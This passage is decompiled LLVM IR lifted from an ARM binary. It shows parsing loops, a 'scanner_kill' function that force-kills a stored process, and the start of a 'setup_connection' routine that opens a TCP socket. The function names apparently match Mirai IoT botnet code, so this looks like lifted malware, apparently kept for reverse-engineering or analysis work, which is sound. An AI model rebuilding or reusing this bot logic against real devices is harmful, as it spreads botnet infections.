  %v0_e8e8 = phi i32 [ %v0_e8e842, %dec_label_pc_e8e8.preheader ], [ %v3_e900, %dec_label_pc_e8f0 ]
  %v7_e8e8 = icmp eq i32 %v0_e8e8, 191
  store i1 %v7_e8e8, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_e8e8, 192
  br i1 %tmp, label %dec_label_pc_e9ac, label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e8e8
  %v1_e8f0 = add i32 %v0_e9b0, 1
  %v2_e8f0 = inttoptr i32 %v1_e8f0 to i8*
  %v3_e8f0 = load i8, i8* %v2_e8f0, align 1
  %v4_e8f0 = zext i8 %v3_e8f0 to i32
  %v2_e8f4 = or i32 %v4_e8f0, -49152
  %v0_e8fc = load i32, i32* @r5, align 4
  %v1_e8f8 = add i32 %v0_e8fc, %v0_e8f4
  %v2_e8fc = add i32 %v1_e8f8, %v2_e8f4
  store i32 %v2_e8fc, i32* %r3.global-to-local, align 4
  %v1_e900 = inttoptr i32 %v2_e8fc to i8*
  %v2_e900 = load i8, i8* %v1_e900, align 1
  %v3_e900 = zext i8 %v2_e900 to i32
  store i32 %v3_e900, i32* %r2.global-to-local, align 4
  %v2_e904 = icmp eq i8 %v2_e900, 0
  store i1 %v2_e904, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_e90c = mul nuw nsw i32 %v3_e900, 256
  store i32 %v3_e90c, i32* @r1, align 4
  br i1 %v2_e904, label %dec_label_pc_e914, label %dec_label_pc_e8e8

dec_label_pc_e914:                                ; preds = %dec_label_pc_e8d8.backedge, %dec_label_pc_e8f0, %dec_label_pc_e8cc
  %v1_e918 = phi i32 [ 1, %dec_label_pc_e8cc ], [ %v1_e9b4, %dec_label_pc_e8f0 ], [ %v1_e9b450, %dec_label_pc_e8d8.backedge ]
  %v0_e914 = phi i32 [ 0, %dec_label_pc_e8cc ], [ 1, %dec_label_pc_e8f0 ], [ %v0_e9ac, %dec_label_pc_e8d8.backedge ]
  %v7_e914 = icmp eq i32 %v0_e914, 1
  store i1 %v7_e914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e914, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_e914
  %v2_e918 = add i32 %v1_e918, 1
  store i32 %v2_e918, i32* %ip.global-to-local, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_e914, %bb119
  %v1_e91c = phi i32 [ %v1_e918, %dec_label_pc_e914 ], [ %v2_e918, %bb119 ]
  %v2_e91c = add i32 %v1_e91c, %v0_e91c143
  store i32 %v2_e91c, i32* @r4, align 4
  %v3_e920 = inttoptr i32 %v2_e91c to i8*
  %v4_e920 = load i8, i8* %v3_e920, align 1
  %v6_e920 = zext i8 %v4_e920 to i32
  store i32 %v6_e920, i32* %r3.global-to-local, align 4
  %v1_e924 = add i32 %v2_e91c, 1
  %v2_e924 = inttoptr i32 %v1_e924 to i8*
  %v3_e924 = load i8, i8* %v2_e924, align 1
  %v4_e924 = zext i8 %v3_e924 to i32
  store i32 %v4_e924, i32* %r2.global-to-local, align 4
  %v4_e928 = mul nuw nsw i32 %v4_e924, 256
  %v5_e928 = or i32 %v4_e928, %v6_e920
  store i32 %v5_e928, i32* %r3.global-to-local, align 4
  %v7_e92c = icmp eq i32 %v5_e928, 256
  store i1 %v7_e92c, i1* %cpsr_z.global-to-local, align 1
  %v1_e930 = add i32 %v2_e91c, 10
  store i32 %v1_e930, i32* @r7, align 4
  br i1 %v7_e92c, label %dec_label_pc_e9cc, label %dec_label_pc_e938

dec_label_pc_e938:                                ; preds = %dec_label_pc_e9cc, %bb120
  store i32 %v1_e930, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e94424 = inttoptr i32 %v1_e930 to i8*
  %v2_e94425 = load i8, i8* %v1_e94424, align 1
  %v3_e94426 = zext i8 %v2_e94425 to i32
  store i32 %v3_e94426, i32* %r2.global-to-local, align 4
  %v2_e94827 = icmp eq i8 %v2_e94425, 0
  store i1 %v2_e94827, i1* %cpsr_z.global-to-local, align 1
  %v3_e94c28 = mul nuw nsw i32 %v3_e94426, 256
  store i32 %v3_e94c28, i32* @r1, align 4
  br i1 %v2_e94827, label %dec_label_pc_e980, label %dec_label_pc_e954.preheader

dec_label_pc_e954.preheader:                      ; preds = %dec_label_pc_e938, %dec_label_pc_e944.backedge
  %v1_e9c4 = phi i32 [ %v1_e9c465, %dec_label_pc_e944.backedge ], [ 1, %dec_label_pc_e938 ]
  %v0_e9bc63 = phi i32 [ %v0_e9bc, %dec_label_pc_e944.backedge ], [ 0, %dec_label_pc_e938 ]
  %v0_e96061 = phi i32 [ %v3_e94c, %dec_label_pc_e944.backedge ], [ %v3_e94c28, %dec_label_pc_e938 ]
  %v0_e95c59 = phi i32 [ %v1_e9c0, %dec_label_pc_e944.backedge ], [ %v1_e930, %dec_label_pc_e938 ]
  %v0_e95457 = phi i32 [ %v3_e944, %dec_label_pc_e944.backedge ], [ %v3_e94426, %dec_label_pc_e938 ]
  br label %dec_label_pc_e954

dec_label_pc_e954:                                ; preds = %dec_label_pc_e954.preheader, %dec_label_pc_e95c
  %v0_e9bc = phi i32 [ %v0_e9bc63, %dec_label_pc_e954.preheader ], [ 1, %dec_label_pc_e95c ]
  %v0_e960 = phi i32 [ %v0_e96061, %dec_label_pc_e954.preheader ], [ %v3_e978, %dec_label_pc_e95c ]
  %v0_e9c0 = phi i32 [ %v0_e95c59, %dec_label_pc_e954.preheader ], [ %v2_e968, %dec_label_pc_e95c ]
  %v0_e954 = phi i32 [ %v0_e95457, %dec_label_pc_e954.preheader ], [ %v3_e96c, %dec_label_pc_e95c ]
  %v7_e954 = icmp eq i32 %v0_e954, 191
  store i1 %v7_e954, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_e954, 192
  br i1 %tmp159, label %dec_label_pc_e9bc, label %dec_label_pc_e95c

dec_label_pc_e95c:                                ; preds = %dec_label_pc_e954
  %v1_e95c = add i32 %v0_e9c0, 1
  %v2_e95c = inttoptr i32 %v1_e95c to i8*
  %v3_e95c = load i8, i8* %v2_e95c, align 1
  %v4_e95c = zext i8 %v3_e95c to i32
  %v2_e960 = or i32 %v4_e95c, -49152
  %v0_e968 = load i32, i32* @r5, align 4
  %v1_e964 = add i32 %v0_e968, %v0_e960
  %v2_e968 = add i32 %v1_e964, %v2_e960
  store i32 %v2_e968, i32* %r3.global-to-local, align 4
  %v1_e96c = inttoptr i32 %v2_e968 to i8*
  %v2_e96c = load i8, i8* %v1_e96c, align 1
  %v3_e96c = zext i8 %v2_e96c to i32
  store i32 %v3_e96c, i32* %r2.global-to-local, align 4
  %v2_e970 = icmp eq i8 %v2_e96c, 0
  store i1 %v2_e970, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_e978 = mul nuw nsw i32 %v3_e96c, 256
  store i32 %v3_e978, i32* @r1, align 4
  br i1 %v2_e970, label %dec_label_pc_e980, label %dec_label_pc_e954

dec_label_pc_e980:                                ; preds = %dec_label_pc_e944.backedge, %dec_label_pc_e95c, %dec_label_pc_e938
  %v1_e984 = phi i32 [ 1, %dec_label_pc_e938 ], [ %v1_e9c4, %dec_label_pc_e95c ], [ %v1_e9c465, %dec_label_pc_e944.backedge ]
  %v0_e980 = phi i32 [ 0, %dec_label_pc_e938 ], [ 1, %dec_label_pc_e95c ], [ %v0_e9bc, %dec_label_pc_e944.backedge ]
  %v7_e980 = icmp eq i32 %v0_e980, 1
  store i1 %v7_e980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e980, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_e980
  %v2_e984 = add i32 %v1_e984, 1
  store i32 %v2_e984, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_e9e0, %dec_label_pc_e980, %bb121
  %v1_e988 = phi i32 [ %v5_e9f8, %dec_label_pc_e9e0 ], [ %v1_e984, %dec_label_pc_e980 ], [ %v2_e984, %bb121 ]
  %v2_e988 = add i32 %v1_e988, %v1_e930
  br label %dec_label_pc_e8b8.backedge

dec_label_pc_e8b8.backedge:                       ; preds = %bb122, %dec_label_pc_ea04
  %v0_e8b8.pre = phi i32 [ %v3_e8c4144, %bb122 ], [ %v0_e8b8.pre.pre, %dec_label_pc_ea04 ]
  %storemerge29 = phi i32 [ %v2_e988, %bb122 ], [ %v2_ea7c, %dec_label_pc_ea04 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_e8b8 = add i32 %v0_e8b8.pre, -1
  %v3_e8bc = mul i32 %v1_e8b8, 65536
  store i32 %v3_e8bc, i32* %r3.global-to-local, align 4
  %v7_e8c0 = icmp eq i32 %v3_e8bc, -65536
  store i1 %v7_e8c0, i1* %cpsr_z.global-to-local, align 1
  %v3_e8c4 = urem i32 %v1_e8b8, 65536
  store i32 %v3_e8c4, i32* @r8, align 4
  br i1 %v7_e8c0, label %dec_label_pc_e840, label %dec_label_pc_e8cc

dec_label_pc_e990:                                ; preds = %dec_label_pc_e840
  %v1_e990 = add i32 %v0_e848, 4
  %v2_e990 = inttoptr i32 %v1_e990 to i32*
  %v3_e990 = load i32, i32* %v2_e990, align 4
  store i32 %v3_e990, i32* %r0.global-to-local, align 4
  %v2_e994 = icmp eq i32 %v3_e990, 0
  store i1 %v2_e994, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_e99c.141 to i32), i32* @lr, align 4
  %v1_e998 = xor i1 %v2_e994, true
  call void @__pseudo_cond_branch(i1 %v1_e998, i32 ptrtoint (i32* @global_var_1357c.35 to i32))
  %v0_e99c = load i32, i32* @fp, align 4
  store i32 %v0_e99c, i32* @r0, align 4
  %v0_e9a0 = call i32 @free()
  store i32 %v0_e9a0, i32* %r0.global-to-local, align 4
  %v0_e9a4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e854

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e8e8
  %v2_e9ac = icmp eq i32 %v0_e9ac, 0
  store i1 %v2_e9ac, i1* %cpsr_z.global-to-local, align 1
  %v1_e9b0 = add i32 %v0_e9b0, 1
  store i32 %v1_e9b0, i32* %r3.global-to-local, align 4
  br i1 %v2_e9ac, label %bb123, label %dec_label_pc_e8d8.backedge

dec_label_pc_e8d8.backedge:                       ; preds = %dec_label_pc_e9ac, %bb123
  %v1_e9b450 = phi i32 [ %v1_e9b4, %dec_label_pc_e9ac ], [ %v2_e9b4, %bb123 ]
  %v1_e8d8 = inttoptr i32 %v1_e9b0 to i8*
  %v2_e8d8 = load i8, i8* %v1_e8d8, align 1
  %v3_e8d8 = zext i8 %v2_e8d8 to i32
  store i32 %v3_e8d8, i32* %r2.global-to-local, align 4
  %v2_e8dc = icmp eq i8 %v2_e8d8, 0
  store i1 %v2_e8dc, i1* %cpsr_z.global-to-local, align 1
  %v3_e8e0 = mul nuw nsw i32 %v3_e8d8, 256
  store i32 %v3_e8e0, i32* @r1, align 4
  br i1 %v2_e8dc, label %dec_label_pc_e914, label %dec_label_pc_e8e8.preheader

bb123:                                            ; preds = %dec_label_pc_e9ac
  %v2_e9b4 = add i32 %v1_e9b4, 1
  store i32 %v2_e9b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e8d8.backedge

dec_label_pc_e9bc:                                ; preds = %dec_label_pc_e954
  %v2_e9bc = icmp eq i32 %v0_e9bc, 0
  store i1 %v2_e9bc, i1* %cpsr_z.global-to-local, align 1
  %v1_e9c0 = add i32 %v0_e9c0, 1
  store i32 %v1_e9c0, i32* %r3.global-to-local, align 4
  br i1 %v2_e9bc, label %bb124, label %dec_label_pc_e944.backedge

dec_label_pc_e944.backedge:                       ; preds = %dec_label_pc_e9bc, %bb124
  %v1_e9c465 = phi i32 [ %v1_e9c4, %dec_label_pc_e9bc ], [ %v2_e9c4, %bb124 ]
  %v1_e944 = inttoptr i32 %v1_e9c0 to i8*
  %v2_e944 = load i8, i8* %v1_e944, align 1
  %v3_e944 = zext i8 %v2_e944 to i32
  store i32 %v3_e944, i32* %r2.global-to-local, align 4
  %v2_e948 = icmp eq i8 %v2_e944, 0
  store i1 %v2_e948, i1* %cpsr_z.global-to-local, align 1
  %v3_e94c = mul nuw nsw i32 %v3_e944, 256
  store i32 %v3_e94c, i32* @r1, align 4
  br i1 %v2_e948, label %dec_label_pc_e980, label %dec_label_pc_e954.preheader

bb124:                                            ; preds = %dec_label_pc_e9bc
  %v2_e9c4 = add i32 %v1_e9c4, 1
  store i32 %v2_e9c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e944.backedge

dec_label_pc_e9cc:                                ; preds = %bb120
  %v1_e9cc = add i32 %v2_e91c, 2
  %v2_e9cc = inttoptr i32 %v1_e9cc to i8*
  %v3_e9cc = load i8, i8* %v2_e9cc, align 1
  %v4_e9cc = zext i8 %v3_e9cc to i32
  store i32 %v4_e9cc, i32* %r3.global-to-local, align 4
  %v1_e9d0 = add i32 %v2_e91c, 3
  %v2_e9d0 = inttoptr i32 %v1_e9d0 to i8*
  %v3_e9d0 = load i8, i8* %v2_e9d0, align 1
  %v4_e9d0 = zext i8 %v3_e9d0 to i32
  store i32 %v4_e9d0, i32* %r2.global-to-local, align 4
  %v4_e9d4 = mul nuw nsw i32 %v4_e9d0, 256
  %v5_e9d4 = or i32 %v4_e9d4, %v4_e9cc
  store i32 %v5_e9d4, i32* %r3.global-to-local, align 4
  %v7_e9d8 = icmp eq i32 %v5_e9d4, 256
  store i1 %v7_e9d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d8, label %dec_label_pc_e9e0, label %dec_label_pc_e938

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e9cc
  %v1_e9e0 = add i32 %v2_e91c, 9
  %v2_e9e0 = inttoptr i32 %v1_e9e0 to i8*
  %v3_e9e0 = load i8, i8* %v2_e9e0, align 1
  %v4_e9e0 = zext i8 %v3_e9e0 to i32
  store i32 %v4_e9e0, i32* %r2.global-to-local, align 4
  %v1_e9e4 = add i32 %v2_e91c, 8
  %v2_e9e4 = inttoptr i32 %v1_e9e4 to i8*
  %v3_e9e4 = load i8, i8* %v2_e9e4, align 1
  %v4_e9e4 = zext i8 %v3_e9e4 to i32
  %v4_e9e8 = mul nuw nsw i32 %v4_e9e0, 256
  %v5_e9e8 = or i32 %v4_e9e4, %v4_e9e8
  %v3_e9ec = mul i32 %v5_e9e8, 65536
  store i32 %v3_e9ec, i32* %r3.global-to-local, align 4
  %v3_e9f0 = mul nuw nsw i32 %v4_e9e4, 256
  store i32 %v3_e9f0, i32* %r2.global-to-local, align 4
  %v5_e9f8 = or i32 %v3_e9f0, %v4_e9e0
  store i32 %v5_e9f8, i32* %r0.global-to-local, align 4
  %v7_e9fc = icmp eq i32 %v5_e9f8, 4
  store i1 %v7_e9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9fc, label %dec_label_pc_ea04, label %bb122

dec_label_pc_ea04:                                ; preds = %dec_label_pc_e9e0
  %v2_ea04 = inttoptr i32 %v1_e930 to i8*
  %v3_ea04 = load i8, i8* %v2_ea04, align 1
  %v4_ea04 = zext i8 %v3_ea04 to i32
  store i32 %v4_ea04, i32* %r3.global-to-local, align 4
  store i32 %v2_e614, i32* %r2.global-to-local, align 4
  %v1_ea10 = add i32 %v2_e91c, 11
  %v2_ea10 = inttoptr i32 %v1_ea10 to i8*
  %v3_ea10 = load i8, i8* %v2_ea10, align 1
  %v4_ea10 = zext i8 %v3_ea10 to i32
  store i32 %v4_ea10, i32* %r2.global-to-local, align 4
  store i32 %v2_e614, i32* %r3.global-to-local, align 4
  %v1_ea1c = add i32 %v2_e91c, 12
  %v2_ea1c = inttoptr i32 %v1_ea1c to i8*
  %v3_ea1c = load i8, i8* %v2_ea1c, align 1
  %v4_ea1c = zext i8 %v3_ea1c to i32
  store i32 %v4_ea1c, i32* %r3.global-to-local, align 4
  store i32 %v2_e614, i32* %ip.global-to-local, align 4
  %v1_ea28 = add i32 %v2_e91c, 13
  %v2_ea28 = inttoptr i32 %v1_ea28 to i8*
  %v3_ea28 = load i8, i8* %v2_ea28, align 1
  %v4_ea28 = zext i8 %v3_ea28 to i32
  store i32 %v4_ea28, i32* %r2.global-to-local, align 4
  %v0_ea30 = load i32, i32* @fp, align 4
  %v1_ea30 = inttoptr i32 %v0_ea30 to i8*
  %v2_ea30 = load i8, i8* %v1_ea30, align 1
  %v3_ea30 = zext i8 %v2_ea30 to i32
  %v1_ea34 = mul nuw nsw i32 %v3_ea30, 4
  %v3_ea38 = add nuw nsw i32 %v1_ea34, 4
  store i32 %v3_ea38, i32* %r1.global-to-local, align 4
  %v1_ea3c = add i32 %v0_ea30, 4
  %v2_ea3c = inttoptr i32 %v1_ea3c to i32*
  %v3_ea3c = load i32, i32* %v2_ea3c, align 4
  store i32 %v3_ea3c, i32* %r0.global-to-local, align 4
  %v3_ea40 = sext i8 %v3_ea28 to i32
  %v5_ea40 = sext i8 %v3_ea1c to i32
  %v10_ea40 = inttoptr i32 %v3_ea3c to i32*
  %v11_ea40 = call i32 @realloc(i32* %v10_ea40, i32 %v3_ea38, i32 %v3_ea40, i32 %v5_ea40)
  store i32 %v11_ea40, i32* %r0.global-to-local, align 4
  %v0_ea44 = load i32, i32* @fp, align 4
  %v1_ea44 = inttoptr i32 %v0_ea44 to i8*
  %v2_ea44 = load i8, i8* %v1_ea44, align 1
  %v3_ea44 = zext i8 %v2_ea44 to i32
  store i32 %v3_ea44, i32* %r2.global-to-local, align 4
  store i32 %v2_e614, i32* @lr, align 4
  %v4_ea4c = sext i8 %v3_ea04 to i32
  store i32 %v4_ea4c, i32* %r3.global-to-local, align 4
  %v1_ea50 = add nuw nsw i32 %v3_ea44, 1
  store i32 %v1_ea50, i32* @r1, align 4
  %v5_ea54 = mul nuw nsw i32 %v3_ea44, 4
  %v6_ea54 = add i32 %v5_ea54, %v11_ea40
  %v7_ea54 = inttoptr i32 %v6_ea54 to i32*
  store i32 %v4_ea4c, i32* %v7_ea54, align 4
  %v1_ea58 = load i32, i32* @fp, align 4
  %v2_ea58 = add i32 %v1_ea58, 4
  %v3_ea58 = inttoptr i32 %v2_ea58 to i32*
  store i32 %v11_ea40, i32* %v3_ea58, align 4
  %v0_ea5c = load i32, i32* @r1, align 4
  %v1_ea5c = trunc i32 %v0_ea5c to i8
  %v2_ea5c = load i32, i32* @fp, align 4
  %v3_ea5c = inttoptr i32 %v2_ea5c to i8*
  store i8 %v1_ea5c, i8* %v3_ea5c, align 1
  %v0_ea60 = load i32, i32* @r4, align 4
  %v1_ea60 = add i32 %v0_ea60, 9
  %v2_ea60 = inttoptr i32 %v1_ea60 to i8*
  %v3_ea60 = load i8, i8* %v2_ea60, align 1
  %v4_ea60 = zext i8 %v3_ea60 to i32
  store i32 %v4_ea60, i32* %r3.global-to-local, align 4
  %v1_ea64 = add i32 %v0_ea60, 8
  %v2_ea64 = inttoptr i32 %v1_ea64 to i8*
  %v3_ea64 = load i8, i8* %v2_ea64, align 1
  %v4_ea64 = zext i8 %v3_ea64 to i32
  %v4_ea68 = mul nuw nsw i32 %v4_ea60, 256
  %v5_ea68 = or i32 %v4_ea64, %v4_ea68
  %v3_ea6c = mul i32 %v5_ea68, 65536
  store i32 %v3_ea6c, i32* %r2.global-to-local, align 4
  %v3_ea70 = mul nuw nsw i32 %v4_ea64, 256
  store i32 %v3_ea70, i32* %r3.global-to-local, align 4
  %v5_ea78 = or i32 %v3_ea70, %v4_ea60
  store i32 %v5_ea78, i32* %r0.global-to-local, align 4
  %v0_ea7c = load i32, i32* @r7, align 4
  %v2_ea7c = add i32 %v0_ea7c, %v5_ea78
  %v0_e8b8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e8b8.backedge

; uselistorder directives
  uselistorder i32 %v3_ea70, { 1, 0 }
  uselistorder i32 %v4_ea60, { 1, 0, 2 }
  uselistorder i32 %v11_ea40, { 1, 0, 2 }
  uselistorder i32 %v3_ea38, { 1, 0 }
  uselistorder i32 %v5_e9f8, { 1, 2, 0 }
  uselistorder i32 %v3_e9f0, { 1, 0 }
  uselistorder i32 %v4_e9e0, { 1, 0, 2 }
  uselistorder i32 %v2_e9c4, { 1, 0 }
  uselistorder i32 %v3_e944, { 0, 2, 1 }
  uselistorder i32 %v1_e9c465, { 1, 0 }
  uselistorder i32 %v1_e9c0, { 1, 2, 0 }
  uselistorder i32 %v2_e9b4, { 1, 0 }
  uselistorder i32 %v3_e8d8, { 0, 2, 1 }
  uselistorder i32 %v1_e9b450, { 1, 0 }
  uselistorder i32 %v1_e9b0, { 1, 2, 0 }
  uselistorder i1 %v7_e8c0, { 1, 0 }
  uselistorder i32 %v1_e8b8, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_e96c, { 0, 2, 1 }
  uselistorder i32 %v2_e968, { 1, 2, 0 }
  uselistorder i32 %v0_e9bc, { 2, 0, 1 }
  uselistorder i32 %v1_e9c4, { 1, 2, 0 }
  uselistorder i32 %v3_e94c28, { 1, 0 }
  uselistorder i32 %v3_e94426, { 1, 0, 2 }
  uselistorder i32 %v1_e930, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_e91c, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_e900, { 0, 2, 1 }
  uselistorder i32 %v2_e8fc, { 1, 2, 0 }
  uselistorder i32 %v0_e9ac, { 2, 0, 1 }
  uselistorder i32 %v1_e9b4, { 1, 2, 0 }
  uselistorder i32 %v3_e8e022, { 1, 0 }
  uselistorder i32 %v3_e8d820, { 1, 0, 2 }
  uselistorder i32 %v0_e91c143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_e8c4142, { 1, 0 }
  uselistorder i1 %v7_e8c0141, { 1, 0 }
  uselistorder i32 %v1_e8b8134, { 1, 0 }
  uselistorder i1 %v9_e894, { 1, 0 }
  uselistorder i32 %v0_e854, { 1, 0 }
  uselistorder i32 %v0_e848, { 1, 0, 2 }
  uselistorder i32 %v0_e838, { 1, 0 }
  uselistorder i32 %v0_e810, { 1, 0 }
  uselistorder i32 %v1_e7c4, { 1, 0, 2 }
  uselistorder i1 %v7_e7bc, { 1, 0 }
  uselistorder i32 %v5_e7b8, { 1, 0, 2 }
  uselistorder i32 %v1_e780, { 1, 0 }
  uselistorder i32 %v3_e76c, { 1, 0 }
  uselistorder i32 %v0_e764, { 1, 0 }
  uselistorder i32 %v1_e758, { 1, 2, 0 }
  uselistorder i1 %v7_e710, { 1, 0 }
  uselistorder i32 %v4_e70c, { 1, 0, 2 }
  uselistorder i1 %v7_e6f4, { 1, 0 }
  uselistorder i32 %v3_e6f0, { 1, 0, 2 }
  uselistorder i1 %v7_e6d8, { 1, 0 }
  uselistorder i32 %v3_e6d4, { 2, 1, 0, 3 }
  uselistorder i1 %v7_e6bc, { 2, 1, 0 }
  uselistorder i32 %v1_e6c0, { 1, 0 }
  uselistorder i32 %v2_e770, { 1, 0 }
  uselistorder i32 %v2_e748, { 1, 0, 2 }
  uselistorder i16 %v5_e664, { 1, 0 }
  uselistorder i32 %v2_e660, { 1, 0, 2 }
  uselistorder i32 %v6_e64c, { 1, 2, 0 }
  uselistorder i64 %v5_e648, { 0, 2, 1 }
  uselistorder i32 %v1_e634, { 1, 0, 2 }
  uselistorder i32 %v1_e5ec, { 1, 0 }
  uselistorder i32 %v1_e5e8, { 1, 2, 0 }
  uselistorder i32 %v2_e5e4, { 1, 0 }
  uselistorder i1 %v8_e5d0, { 1, 0 }
  uselistorder i32 %v2_e5a8, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 36, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 37 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 13, 9, 0, 11, 12, 27, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 34, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 5, 12, 6, 17, 7, 8, 18, 9, 10, 11, 2, 13, 14, 15, 16, 0, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 30, 31, 36, 33, 34, 32, 35, 37 }
  uselistorder i32 (i32)* @sleep, { 11, 10, 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e944.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e8d8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e8b8.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e954, { 1, 0 }
  uselistorder label %dec_label_pc_e954.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_e8e8, { 1, 0 }
  uselistorder label %dec_label_pc_e8e8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e8cc, { 1, 0 }
  uselistorder label %dec_label_pc_e854, { 1, 0 }
  uselistorder label %dec_label_pc_e840, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e820, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e5c8, { 1, 0 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_ea90 = load i32, i32* @global_var_24f34.143, align 4
  %v2_ea98 = call i32 @kill(i32 %v2_ea90, i32 9)
  ret i32 %v2_ea98

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_eaac = load i32, i32* @r4, align 4
  store i32 %v3_eaac, i32* %stack_var_-16, align 4
  %v6_eaac = load i32, i32* @r5, align 4
  %v9_eaac = load i32, i32* @r6, align 4
  %v12_eaac = load i32, i32* @lr, align 4
  %v0_eab0 = load i32, i32* @r0, align 4
  store i32 %v0_eab0, i32* @r5, align 4
  %v1_eab4 = add i32 %v0_eab0, 4
  %v2_eab4 = inttoptr i32 %v1_eab4 to i32*
  %v3_eab4 = load i32, i32* %v2_eab4, align 4
  store i32 %v3_eab4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 60120, i32* @lr, align 4
  %v1_ead4 = icmp ne i32 %v3_eab4, -1
  call void @__pseudo_cond_branch(i1 %v1_ead4, i32 ptrtoint (i32* @global_var_14a50.115 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_eae0 = load i32, i32* @r6, align 4
  store i32 %v0_eae0, i32* %r2.global-to-local, align 4
  %v3_eae4 = call i32 @socket(i32 2, i32 1, i32 %v0_eae0)
  store i32 %v3_eae4, i32* %r0.global-to-local, align 4
  %v7_eae8 = icmp eq i32 %v3_eae4, -1
  %v1_eaec = load i32, i32* @r5, align 4
  %v2_eaec = add i32 %v1_eaec, 4
  %v3_eaec = inttoptr i32 %v2_eaec to i32*
  store i32 %v3_eae4, i32* %v3_eaec, align 4
  br i1 %v7_eae8, label %entry.dec_label_pc_eb64_crit_edge, label %dec_label_pc_eaf4

entry.dec_label_pc_eb64_crit_edge:                ; preds = %entry
  %v1_eb6c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb64

dec_label_pc_eaf4:                                ; preds = %entry
  %v2_eab8 = ptrtoint i32* %stack_var_-32 to i32
  %v0_eaf4 = load i32, i32* @r5, align 4
  %v1_eaf4 = add i32 %v0_eaf4, 28
  store i32 %v1_eaf4, i32* @r0, align 4
  %v0_eaf8 = load i32, i32* @r6, align 4
  %v2_eaf8 = add i32 %v0_eaf4, 24
  %v3_eaf8 = inttoptr i32 %v2_eaf8 to i32*
  store i32 %v0_eaf8, i32* %v3_eaf8, align 4
  store i32 356, i32* @r1, align 4
  %v0_eb00 = call i32 @util_zero()
  store i32 %v0_eb00, i32* %r0.global-to-local, align 4
  %v0_eb04 = load i32, i32* @r5, align 4
  %v1_eb04 = add i32 %v0_eb04, 4
  %v2_eb04 = inttoptr i32 %v1_eb04 to i32*
  %v3_eb04 = load i32, i32* %v2_eb04, align 4
  store i32 %v3_eb04, i32* @r4, align 4
  %v0_eb08 = load i32, i32* @r6, align 4
  store i32 %v0_eb08, i32* @r2, align 4
